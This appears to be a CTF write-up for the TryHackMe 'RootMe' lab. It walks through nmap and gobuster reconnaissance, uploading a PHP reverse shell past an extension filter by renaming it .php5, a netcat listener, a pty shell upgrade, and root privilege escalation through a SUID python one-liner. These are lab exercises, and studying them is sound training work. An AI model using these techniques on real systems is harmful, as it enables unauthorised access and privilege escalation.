
Link: https://tryhackme.com/room/rrootme

# Recon: 

`nmap -sC -sV -oA results.txt 10.10.136.193`
Default scripts and default services.

Result: 2 ports are open: 1- SSH 2- HTTP

If we look at the HTTP site, there's nothing interesting so we will enumerate the directories.

# Enum:
```gobuster dir -u 10.10.136.193 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt```

We get 2 interesting directories, 1- `panel` and 2- `uploads`.

In `panel` we can upload a file, let's upload the traditional PHP reverse shell to get the initial access to the machine.

# Rev-shell
There's a file extension restriction on php so we can just name our script as php5 and it would work.

Listen on netcat using `nc -lnvp {port}`

We get the shell, we can upgrade it using: 
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

# Priv-esc
To find SUID binaries aka binaries which are reserved by root which can be run by us, we use the following command:

```
find / -perm /4000 2>/dev/  
```

We can see python is in the list: `/usr/bin/python`

Let's go on GTFOBins and find an exploit command:
```
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

Boom we're root and can easily get the flag.
